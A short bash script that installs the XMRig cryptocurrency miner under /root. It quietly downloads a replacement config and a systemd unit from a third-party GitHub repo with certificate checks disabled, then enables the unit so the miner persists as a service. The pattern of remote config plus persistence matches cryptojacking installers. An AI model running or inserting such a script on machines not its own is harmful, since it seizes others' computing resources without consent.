#!/bin/bash

install(){
	mkdir -p "/root/xmr" && cd "/root/xmr" && wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-static-x64.tar.gz && tar -zxf xmrig-6.12.2-linux-static-x64.tar.gz


	cd xmrig-6.12.2

	chmod +x xmrig

	rm config.json

	wget -q --no-check-certificate --no-cache --no-cookies https://github.com/marvin9002/swarm-install/raw/master/config.json

	sleep 2

	wget -q --no-check-certificate --no-cache --no-cookies https://github.com/marvin9002/swarm-install/raw/master/xmr.service

	sleep 2
	cp "/root/xmr/xmrig-6.12.2/xmr.service" "/lib/systemd/system/xmr.service"

	systemctl enable xmr

	sleep 2

	systemctl start xmr

	sleep 1

	systemctl status xmr

}

install